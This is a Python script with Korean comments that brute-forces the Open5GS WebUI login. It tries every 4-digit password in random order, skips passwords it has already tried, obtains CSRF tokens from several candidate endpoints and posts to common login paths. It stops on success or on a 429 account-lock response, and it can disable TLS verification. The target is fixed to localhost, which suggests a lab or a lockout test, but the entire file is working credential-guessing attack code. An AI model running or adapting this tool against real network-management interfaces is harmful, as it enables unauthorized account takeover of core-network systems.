#!/usr/bin/env python3
"""
Open5GS WebUI brute-force login helper (random 4-digit password, CSRF-aware).

- Username은 입력으로 받음.
- Password는 0000~9999 범위에서 랜덤하게 생성 후 시도.
- 이미 시도한 비밀번호는 다시 시도하지 않음.
- 로그인 성공(2xx) → 중단.
- 실패(401 등) → 계속.
- 계정 잠김(429) → 중단.
"""

from __future__ import annotations
import argparse
import json
import sys
import ssl
import random
import re
from dataclasses import dataclass
from typing import Iterable, Optional, Tuple, Dict
import urllib.request
import urllib.parse
import http.cookiejar
from urllib.error import HTTPError, URLError
from http import HTTPStatus

def format_status(code: int, fallback: str = "") -> str:
    try:
        return f"{code} {HTTPStatus(code).phrase}"
    except ValueError:
        return f"{code} {fallback or 'Unknown Status'}"

@dataclass
class Attempt:
    path: str
    kind: str
    fields: Tuple[str, str]


@dataclass
class SimpleResponse:
    status_code: int
    reason: str
    headers: Dict[str, str]
    text: str
    cookies: http.cookiejar.CookieJar

    @property
    def ok(self) -> bool:
        return 200 <= self.status_code < 300


DEFAULT_PATHS: Tuple[str, ...] = (
    "/api/auth/login",
    "/auth/login",
    "/api/login",
    "/login",
)

DEFAULT_ATTEMPTS: Tuple[Attempt, ...] = (
    Attempt(path="", kind="json", fields=("username", "password")),
    Attempt(path="", kind="form", fields=("username", "password")),
)

FIXED_BASE_URL = "http://127.0.0.1:9999"   


# -------------------------------
# CSRF 토큰 추출 함수
# -------------------------------
def _extract_csrf_from_html(html: str) -> Optional[str]:
    m = re.search(r'name=["\']_csrf["\']\s+value=["\']([^"\']+)["\']', html, re.IGNORECASE)
    if m:
        return m.group(1)
    m = re.search(r'name=["\']csrf-token["\']\s+content=["\']([^"\']+)["\']', html, re.IGNORECASE)
    if m:
        return m.group(1)
    return None


def _extract_csrf_from_json(text: str) -> Optional[str]:
    try:
        data = json.loads(text)
    except Exception:
        return None
    if isinstance(data, dict):
        for key in ("csrf", "csrfToken", "_csrf"):
            if key in data and isinstance(data[key], str):
                return data[key]
    return None


def fetch_csrf_token(opener, base_url: str, timeout: int) -> Optional[str]:
    """세션/CSRF 토큰 확보"""
    candidates = ["/session", "/csrf", "/api/auth/csrf", "/api/csrf"]
    headers = {"Accept": "application/json, text/html;q=0.9,*/*;q=0.8"}
    for path in candidates:
        url = base_url.rstrip("/") + path
        try:
            with opener.open(urllib.request.Request(url, headers=headers), timeout=timeout) as r:
                body = r.read().decode(r.headers.get_content_charset() or "utf-8", errors="replace")
                ct = r.headers.get("Content-Type", "")
                if "json" in ct:
                    token = _extract_csrf_from_json(body)
                else:
                    token = _extract_csrf_from_html(body)
                if token:
                    return token
        except Exception:
            continue
    return None


# -------------------------------
# 로그인 시도
# -------------------------------
def try_login(base_url: str, username: str, password: str,
              path: Optional[str] = None, insecure: bool = False,
              timeout: int = 10) -> Tuple[Optional[SimpleResponse], Optional[Attempt]]:

    cookie_jar = http.cookiejar.CookieJar()
    if insecure:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        https_handler = urllib.request.HTTPSHandler(context=ctx)
    else:
        https_handler = urllib.request.HTTPSHandler()

    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cookie_jar), https_handler
    )

    # 먼저 CSRF 토큰 요청
    token = fetch_csrf_token(opener, base_url, timeout)

    paths: Iterable[str] = [path] if path else DEFAULT_PATHS
    for p in paths:
        for proto in DEFAULT_ATTEMPTS:
            attempt = Attempt(path=p, kind=proto.kind, fields=proto.fields)
            url = base_url.rstrip("/") + p

            if attempt.kind == "json":
                payload_dict = {attempt.fields[0]: username, attempt.fields[1]: password}
                if token:
                    payload_dict["_csrf"] = token
                payload = json.dumps(payload_dict).encode()
                headers = {"Content-Type": "application/json"}
                if token:
                    headers["x-csrf-token"] = token
            else:
                form = {
                    attempt.fields[0]: username,
                    attempt.fields[1]: password,
                }
                if token:
                    form["_csrf"] = token
                payload = urllib.parse.urlencode(form).encode()
                headers = {"Content-Type": "application/x-www-form-urlencoded"}

            req = urllib.request.Request(url, data=payload, headers=headers, method="POST")

            try:
                with opener.open(req, timeout=timeout) as r:
                    body = r.read().decode(r.headers.get_content_charset() or "utf-8", errors="replace")
                    return SimpleResponse(
                        status_code=getattr(r, "status", 200),
                        reason=getattr(r, "reason", ""),
                        headers={k: v for k, v in r.headers.items()},
                        text=body,
                        cookies=cookie_jar,
                    ), attempt
            except HTTPError as e:
                body = e.read().decode(errors="replace")
                return SimpleResponse(
                    status_code=e.code,
                    reason=str(e.reason) if e.reason else "",
                    headers={k: v for k, v in (e.headers.items() if e.headers else [])},
                    text=body,
                    cookies=cookie_jar,
                ), attempt
            except URLError:
                return None, None

    return None, None


# -------------------------------
# 메인 실행부
# -------------------------------
def parse_args(argv=None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Open5GS WebUI brute-force helper (CSRF-aware)")
    parser.add_argument("-u", "--username", required=True, help="Login username (e.g., admin)")
    parser.add_argument("--path", default=None, help="Explicit login path, e.g., /api/auth/login")
    parser.add_argument("--insecure", action="store_true", help="Disable TLS verification")
    parser.add_argument("--timeout", type=int, default=10, help="HTTP timeout seconds")
    return parser.parse_args(argv)


def main(argv=None) -> int:
    args = parse_args(argv)
    candidates = list(f"{i:04d}" for i in range(10000))
    random.shuffle(candidates)

    for attempt_num, pw in enumerate(candidates, start=1):
        resp, attempt = try_login(
            base_url=FIXED_BASE_URL,
            username=args.username,
            password=pw,
            path=args.path,
            insecure=args.insecure,
            timeout=args.timeout,
        )

        if not resp:
            print(f"[{attempt_num}] password={pw} → NO RESPONSE")
            continue

        print(
            f"[{attempt_num}] username={args.username}, password={pw} → "
            f"{format_status(resp.status_code, resp.reason)}"
            )

        if resp.ok:
            return 0
        elif resp.status_code == 429:
            return 2

    print("[-] No valid password found.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
